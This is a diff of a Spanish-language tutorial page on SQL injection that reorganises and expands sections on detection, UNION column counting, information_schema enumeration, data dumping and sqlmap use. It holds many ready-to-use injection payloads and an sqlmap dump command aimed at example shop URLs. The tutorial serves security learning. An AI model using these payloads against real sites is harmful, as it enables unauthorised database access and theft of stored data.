@@ -1,14 +1,190 @@
----
-cover: >-
-  https://images.unsplash.com/photo-1662027044921-6febc57a0c53?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw5fHxzcWx8ZW58MHx8fHwxNjg5NDMyMTMyfDA&ixlib=rb-4.0.3&q=85
-coverY: -2
----
-
 # SQL Injection (SQLi)
 
 ## ¿Que es una inyección SQL?
 
 Imagina que tienes una web en la que hay usuarios registrados, esta información (usuario, correo, contraseña...) se almacena en una base de datos, para poder usar la base de datos en la web, y cuando por ejemplo tu insertes tu usuario y contraseña, esta compare los datos con los de la base de datos, para ello hay que implementarlo a nivel de código, pero existen métodos, para evadir el código que hay por detrás, y ejecutar las consultas que quieras a la base de datos.
+
+## SQLi Manuales
+
+### Descubrimiento de SQLi
+
+#### Uso de SELECT
+
+Existen varias formas de detectar una inyección SQL:
+
+* Añadiendo el carácter `'` al final de un parámetro para cerrar la comilla que está detrás en el código, por ejemplo
+
+```sql
+SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'
+```
+
+Por ejemplo en esta consulta, selecciona las columnas nombre y precio de la tabla `artículos` donde la categoría sea Bañadores, esta sea la tabla que hay por detrás:
+
+<table><thead><tr><th>Nombre</th><th data-type="number">Precio</th><th>Categoría</th></tr></thead><tbody><tr><td>Gafas Buceo</td><td>13</td><td>Gafas</td></tr><tr><td>Bikini</td><td>20</td><td>Bañadores</td></tr><tr><td>Bañador Adulto</td><td>33</td><td>Bañadores</td></tr><tr><td>Gorro Azul</td><td>5</td><td>Gorros</td></tr></tbody></table>
+
+En el lado de la web, nos mostraría solo el Bikini y el Bañador Adulto con el precio. Por ejemplo, así se vería una inyección en la URL
+
+{% code title="URL Normal" %}
+```
+https://mitienda.com/products?categoria=Bañadores
+```
+{% endcode %}
+
+{% code title="Consulta que se ejecuta" %}
+```sql
+SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'
+```
+{% endcode %}
+
+* Añadiendo una comilla `'` y `-- -` (Estos guiones sirven para comentar todo lo que haya después de eso) al parámetro:
+
+```
+https://mitienda.com/products?categoria=Bañadores'-- -
+```
+
+```sql
+SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'-- -'
+```
+
+* Añadiendo parámetros booleanos ej. `OR 1=1`, `OR 1=2`. Esto hace que la pagina pueda mostrar una respuesta diferente, y si lo hace significa que es vulnerable a una inyección sql
+
+### Inyecciones SQL UNION
+
+{% hint style="info" %}
+El operador `UNION` se usa para ejecutar uno o más consultas `SELECT` y añade los resultados a la consulta original
+
+Por ejemplo, la siguiente consulta, devuelve un único conjunto de resultados con dos columnas, que contiene valores de columnas `a` y `b` en `tabla1` y columnas `c` y `d` en `tabla2`:
+
+```sql
+SELECT a, b FROM tabla1 UNION SELECT c, d FROM tabla2
+```
+{% endhint %}
+
+{% hint style="warning" %}
+Para que la consulta con `UNION` funcione, se deben cumplir dos requisitos clave:
+
+* Las consultas individuales **deben devolver el mismo número de columnas**.
+* **Los tipos de datos en cada columna deben ser compatibles** entre las consultas individuales.
+
+Ósea, que previamente deberemos:
+
+* Saber **cuántas columnas se devuelven** desde la consulta original.
+* Saber **qué columnas devueltas desde la consulta original son de un tipo de datos adecuado** para contener los resultados de la consulta inyectada.
+{% endhint %}
+
+#### Determinando el número de columnas
+
+Cuando hablamos de una SQLi usando la cláusula `UNION`, existen dos métodos efectivos para determinar cuántas columnas se devuelven desde la consulta original.
+
+1.  Un método implica inyectar una serie de cláusulas `ORDER BY` e incrementar el índice de columna especificado hasta que se produzca un error. Por ejemplo, si el punto de inyección es una cadena citada dentro del `WHERE` cláusula de la consulta original, usted enviaría:\
+
+
+    ```sql
+    ' ORDER BY 1--
+    ' ORDER BY 2--
+    ' ORDER BY 3--
+    etc.
+    ```
+
+    \
+    Esta serie de payloads modifica la consulta original para ordenar los resultados por diferentes columnas en el conjunto de resultados.\
+    Cuando el índice de columna especificado excede el número de columnas reales en el conjunto de resultados, la base de datos devuelve un error, como:\
+    `The ORDER BY position number 3 is out of range of the number of items in the select list.`\
+
+2.  El segundo método implica presentar una serie de payloads `UNION SELECT` que especifican un número diferente de valores nulos:\
+
+
+    ```sql
+    ' UNION SELECT NULL--
+    ' UNION SELECT NULL,NULL--
+    ' UNION SELECT NULL,NULL,NULL--
+    etc.
+    ```
+
+    \
+    Si el número de nulos no coincide con el número de columnas, la base de datos devuelve un error, como:\
+    `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`\
+    \
+    Empleamos `NULL` como valores de retorno de la consulta `SELECT` inyectada porque **los tipos de datos de cada columna deben ser compatibles entre la consulta original y la inyectada**. Dado que **NULL es convertible a cualquier tipo de dato común**, se maximiza la probabilidad de que la carga útil funcione siempre y cuando el número de columnas sea correcto.\
+
+
+    Al igual que ocurre con la técnica de `ORDER BY`, la aplicación podría devolver en su respuesta HTTP el mensaje de error de la base de datos; no obstante, también cabe la posibilidad de que muestre un error genérico o sencillamente no devuelva ningún resultado. \
+    \
+    **Cuando la cantidad de `NULL` coincide con el número de columnas, la base de datos añade una fila extra** al conjunto de resultados, con valores `NULL` en todas sus columnas. \
+    El impacto que esto tenga en la respuesta HTTP dependerá del código de la aplicación: si tienes suerte, encontrarás contenido adicional (por ejemplo, una fila más en una tabla HTML). \
+    \
+    En caso contrario, esos valores `NULL` pueden provocar un error distinto, como una `NullPointerException`. Y si llega a darse el peor escenario, la respuesta podría ser idéntica a la que se obtendría por un número incorrecto de `NULL`, lo cual inutilizaría este método.
+
+<details>
+
+<summary>Explicación extendida - ¿Las filas de NULL, se escriben en la tabla?</summary>
+
+## ¿Las filas de NULL, se escriben en la tabla?
+
+Un **SELECT** por sí mismo no modifica ninguna tabla; lo que hace la técnica de inyección con `UNION SELECT` es **combinar** (concatenar) el resultado original de la consulta con el resultado que tú inyectas. En otras palabras, no se está “añadiendo físicamente” nada a la base de datos, sino simplemente se extiende —en memoria— el conjunto de filas que devuelve la consulta.
+
+Supongamos que la aplicación ejecuta internamente algo como:
+
+```sql
+SELECT columna1, columna2
+FROM usuarios
+WHERE id = 42
+```
+
+y tú logras inyectar esto:
+
+```sql
+' UNION SELECT NULL, NULL--
+```
+
+El motor de la base de datos lo interpreta como dos subconsultas unidas:
+
+1.  **Primera parte (consulta legítima):**
+
+    ```sql
+    SELECT columna1, columna2
+    FROM usuarios
+    WHERE id = 42
+    ```
+
+    —esta puede devolver, por ejemplo, una o varias filas según exista el usuario.
+2.  **Segunda parte (tu inyección):**
+
+    ```sql
+    SELECT NULL, NULL
+    ```
+
+    —esta siempre “devuelve” exactamente una fila con dos columnas, ambas con valor `NULL`.
+
+La cláusula `UNION` (o `UNION ALL`, si se usara) concatena los conjuntos de resultados de ambas subconsultas. El resultado global será:
+
+```
+[fila1 de la consulta original]  
+[fila2 de la consulta original]  
+…  
+[última fila de la consulta original]  
+[única fila inyectada: (NULL, NULL)]
+```
+
+Por eso se dice que “la base de datos añade una fila extra con valores NULL”: esa fila no existe en ninguna tabla, sino que es el **resultado** de la segunda subconsulta (`SELECT NULL,…`) combinada con el resultado original.
+
+– Si la consulta original no devuelve ninguna fila (por ejemplo, porque no hay usuario con id = 42), el motor igual ejecuta la parte `UNION SELECT NULL,…` y por tanto el único renglón que se devuelve es el de tus `NULL`.
+
+– Si la consulta original devuelve varias filas, la fila nula aparece al final (o en medio, dependiendo de ORDER BY o del motor) junto con las demás.
+
+Por eso, cuando haces:
+
+```sql
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+```
+
+lo que estás variando es **el número de `NULL` en la segunda SELECT**, para que coincida con el número de columnas que la primera consulta está devolviendo. Si coinciden (por ejemplo, dos columnas → `SELECT NULL,NULL`), el motor acepta el `UNION` sin error y te da una fila extra con dos valores `NULL`. Si no coinciden (por ejemplo, la aplicación esperaba 3 columnas y tú sólo pones `SELECT NULL,NULL`), el motor devolverá un error de “número de columnas no coincide” y no obtendrás ningún resultado.
+
+</details>
+
+3.
 
 ## Usando SQLMap
 
@@ -44,46 +220,6 @@ Una vez tenemos la base de datos, la tabla y la columna, solo nos falta volcar l
 ```bash
 sqlmap -u http://dominio.com/login --forms -D Basededatos -T Tablajemplo -C columna1,columna2 --dump --batch
 ```
-
-## Detectando una SQLi
-
-Existen varias formas de detectar una inyección SQL:
-
-* Añadiendo el carácter `'` al final de un parámetro para cerrar la comilla que está detrás en el código, por ejemplo
-
-```sql
-SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'
-```
-
-Por ejemplo en esta consulta, selecciona las columnas nombre y precio de la tabla `artículos` donde la categoría sea Bañadores, esta sea la tabla que hay por detrás:
-
-<table><thead><tr><th>Nombre</th><th data-type="number">Precio</th><th>Categoría</th></tr></thead><tbody><tr><td>Gafas Buceo</td><td>13</td><td>Gafas</td></tr><tr><td>Bikini</td><td>20</td><td>Bañadores</td></tr><tr><td>Bañador Adulto</td><td>33</td><td>Bañadores</td></tr><tr><td>Gorro Azul</td><td>5</td><td>Gorros</td></tr></tbody></table>
-
-En el lado de la web, nos mostraría solo el Bikini y el Bañador Adulto con el precio. Por ejemplo, así se vería una inyección en la URL
-
-{% code title="URL Normal" %}
-```
-https://mitienda.com/products?categoria=Bañadores
-```
-{% endcode %}
-
-{% code title="Consulta que se ejecuta" %}
-```sql
-SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'
-```
-{% endcode %}
-
-Añadiendo una comilla `'` y `-- -` (Estos guiones sirven para comentar todo lo que haya después de eso) al parámetro:
-
-```
-https://mitienda.com/products?categoria=Bañadores'-- -
-```
-
-```sql
-SELECT nombre,precio FROM artículos WHERE categoría = 'Bañadores'-- -'
-```
-
-* Añadiendo parámetros booleanos ej. `OR 1=1`, `OR 1=2`. Esto hace que la pagina pueda mostrar una respuesta diferente, y si lo hace significa que es vulnerable a una inyección sql
 
 ## Enumerando tablas
 
@@ -129,7 +265,7 @@ https://mitienda.com/products?categoria=Bañadores' union select NULL,NULL from 
 
 Para enumerar bases de datos existentes a través de una SQLi, una vez hayamos comprobado el numero de columnas que se están empleando en la web, a través de uno de los campos, insertamos una consulta con `union` ej:
 
-<pre class="language-url" data-full-width="true"><code class="lang-url"><strong>https://myshop.com/filter?category=Pets' union select NULL, schema_name from information_schema.schemata-- -
+<pre class="language-url" data-full-width="false"><code class="lang-url"><strong>https://myshop.com/filter?category=Pets' union select NULL, schema_name from information_schema.schemata-- -
 </strong></code></pre>
 
 En el caso de que el campo vulnerable sea el primero sería de la siguiente forma:
@@ -137,7 +273,7 @@ En el caso de que el campo vulnerable sea el primero sería de la siguiente form
 <pre data-full-width="false"><code><strong>https://myshop.com/filter?category=Pets' union select schema_name,NULL from information_schema.schemata-- -
 </strong></code></pre>
 
-{% code fullWidth="true" %}
+{% code fullWidth="false" %}
 ```sql
 SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, schema_name FROM information_schema.schemata-- -'
 ```
@@ -167,14 +303,14 @@ Si de esta manera, nos muestra algún dato, solo tendremos que ir bajando de fil
 
 Una vez sepamos las BBDD a las que podemos acceder, podemos enumerar las tablas existentes de cada BD. Esto lo conseguimos de la siguiente forma:
 
-<pre data-full-width="true"><code><strong>https://myshop.com/filter?category=Pets' union select NULL, table_name from information_schema.tables where table_schema = 'Name_BD'-- -
-</strong></code></pre>
-
-{% code fullWidth="true" %}
-```sql
-SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'Name_BD'-- -'
+{% code fullWidth="false" %}
+```
+https://myshop.com/filter?category=Pets' union select NULL, table_name from information_schema.tables where table_schema = 'Name_BD'-- -
 ```
 {% endcode %}
+
+<pre class="language-sql" data-full-width="false"><code class="lang-sql"><strong>SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'Name_BD'-- -'
+</strong></code></pre>
 
 {% hint style="info" %}
 Si ejecutas esta consulta puedes ver todas las tablas de todas las BBDD:
@@ -224,10 +360,10 @@ SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, table_name FRO
 
 Cuando tenemos las BBDD y sus respectivas tablas, ya podremos enumerar las columnas de las respectivas tablas de la siguiente forma:
 
-<pre class="language-url" data-full-width="true"><code class="lang-url"><strong>https://myshop.com/filter?category=Pets' union select NULL, column_name from information_schema.columns where table_schema = 'Name_BD' and table_name = 'Name_Table'-- -
+<pre class="language-url" data-full-width="false"><code class="lang-url"><strong>https://myshop.com/filter?category=Pets' union select NULL, column_name from information_schema.columns where table_schema = 'Name_BD' and table_name = 'Name_Table'-- -
 </strong></code></pre>
 
-{% code fullWidth="true" %}
+{% code fullWidth="false" %}
 ```sql
 SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_schema = 'Name_BD' AND table_name = 'Name_Table'-- -'
 ```
@@ -237,13 +373,13 @@ SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL, column_name FR
 
 Ya que sabemos el nombre de las columnas que hay en la tabla que hemos elegido, podemos volcar los datos para poder visualizarlos de la siguiente manera:
 
-{% code fullWidth="true" %}
+{% code fullWidth="false" %}
 ```url
 https://myshop.com/filter?category=Pets' union select NULL,Column_Name from Table_Name-- -
 ```
 {% endcode %}
 
-<pre class="language-sql" data-full-width="true"><code class="lang-sql"><strong>SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL,Column_Name FROM Table_Name-- -'
+<pre class="language-sql" data-full-width="false"><code class="lang-sql"><strong>SELECT * FROM products WHERE category = 'Pets' UNION SELECT NULL,Column_Name FROM Table_Name-- -'
 </strong></code></pre>
 
 {% hint style="warning" %}
@@ -321,13 +457,13 @@ Podemos volcar el tipo y versión de la BD, una vez sepamos el numero de columna
 
 ### Oracle
 
-{% code fullWidth="true" %}
+{% code fullWidth="false" %}
 ```url
 https://mitienda.com/products?categoria=Bañadores' union select NULL,banner from v$version-- -
 ```
 {% endcode %}
 
-{% code fullWidth="true" %}
+{% code fullWidth="false" %}
 ```
 https://mitienda.com/products?categoria=Bañadores' union select NULL,version from v$instance-- -
 ```
